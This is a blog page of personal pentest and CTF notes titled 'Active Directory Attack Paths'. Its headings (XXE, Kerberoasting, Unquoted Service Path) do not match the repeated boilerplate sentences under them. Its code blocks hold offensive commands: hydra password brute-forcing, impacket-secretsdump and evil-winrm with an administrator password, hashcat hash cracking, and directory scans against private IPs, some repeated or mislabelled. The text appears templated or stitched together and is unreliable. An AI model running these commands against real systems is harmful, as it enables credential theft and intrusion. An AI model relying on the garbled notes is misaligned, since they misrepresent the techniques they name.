---
TitleSEO: "Active Directory Attack Paths | ZureFX"
TitlePost: "Active Directory Attack Paths"
Author: "ZureFX"
Description: "Personal notes on Active Directory Attack Paths. Quick reference for pentesting and CTF challenges."
Keywords: "networking, oscp, privilege escalation, lateral movement"
URL: "https://zurefx.github.io/notes/note-active-directory-attack-paths-450.html"
URL_IMAGES: ""
Date: "2025-07-23"
Tags: "Networking, OSCP, Privilege Escalation, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-active-directory-attack-paths-450"
Permalink: "/notes/note-active-directory-attack-paths-450.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Ubuntu 20.04

### XXE

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
gobuster dir -u http://10.89.213.78/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

- `hydra`
- `hashcat`
- `john`

## Path Traversal

### Kerberoasting

> **Note:** Open Redirect was identified as the primary attack vector in this scenario.

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory.

Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.126.66
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.34.158.235 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p8443,5986,8888 10.85.221.107 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## PostgreSQL

### Unquoted Service Path

```python
nmap -sCV -p25,3389,25 10.34.10.234 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.83.178.33 -u administrator -p 'P@ssw0rd!'
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.29.115.249/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.75.2.192 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

- `burpsuite`
- `psexec`
- `ldapsearch`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.45.144 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```
